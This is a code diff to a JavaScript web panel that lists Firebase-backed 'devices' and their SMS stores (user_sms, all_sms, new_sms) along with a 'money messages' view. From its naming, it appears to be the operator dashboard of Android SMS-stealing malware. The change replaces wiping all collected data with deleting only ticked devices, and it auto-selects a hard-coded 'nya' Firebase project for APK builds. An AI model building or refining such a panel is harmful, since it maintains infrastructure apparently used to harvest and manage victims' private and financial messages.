@@ -968,24 +968,24 @@ function teardownAllFirebaseInstances(){
   firebaseInstances.forEach(teardownFirebaseInstance);
 }
 function deleteChecked(){
-  if(!confirm('Are you sure you want to delete ALL clients and messages?'))return;
-  var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
-  if(!insts.length){toast('No Firebase project',false);return;}
-  Promise.all(insts.map(function(inst){
+  var checked=allDevs.filter(function(d){return isApkChecked(d.id);});
+  if(!checked.length){toast('No checked devices — tick CHECKED on a device first',false);return;}
+  if(!confirm('Delete '+checked.length+' checked device(s) from Firebase?'))return;
+  Promise.all(checked.map(function(d){
+    var inst=getFbInstance(d.fbId);
+    if(!inst)return Promise.resolve(null);
     var auth=getFbAuthKey(inst);
-    var paths={'messages':1,'user_sms':1,'sms_backup':1,'all_sms':1,'new_sms':1};
-    var node=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||'clients';
-    paths[node]=1;
-    nodesToTryForInst(inst).forEach(function(n){
-      if(n&&PANEL_SMS_GLOBAL_NODES.indexOf(n)<0)paths[n]=1;
-    });
+    var paths={};
+    paths[getDeviceProfilePath(d)+'/'+d.rawId]=1;
+    if(shouldUseApkSmsPath(inst,d))paths['messages/'+d.rawId]=1;
     return Promise.all(Object.keys(paths).map(function(p){
       return fetch(buildRestUrl(inst,p,auth),{method:'DELETE'}).catch(function(){return null;});
     }));
   })).then(function(){
-    clientsRawMap={};allDevs=[];selDev='';moneyMessagesList=[];
-    clearListeners();processClientsDataNow();renderMoneyView();
-    toast('All data deleted',true);
+    checked.forEach(function(d){delete clientsRawMap[d.id];});
+    if(checked.some(function(d){return d.id===selDev;})){selDev='';clearListeners();}
+    processClientsDataNow();renderMoneyView();
+    toast('Checked devices deleted',true);
   }).catch(function(){toast('Delete failed',false);});
 }
 function deleteDeviceCard(id,ev){
@@ -1175,6 +1175,10 @@ function saveActiveFb(){
 }
 function ensureActiveFbValid(){
   if(activeFbId&&!firebaseConfigs.some(function(c){return c.id===activeFbId;}))activeFbId='';
+  if(window.NYA_APK&&!activeFbId&&firebaseConfigs.length){
+    var nya=firebaseConfigs.find(function(c){return String(c.id||'')==='nya_hdjdjdj';});
+    if(nya){activeFbId=nya.id;saveActiveFb();}
+  }
 }
 function getActiveFbName(){
   if(!activeFbId)return 'All Firebase Combined';
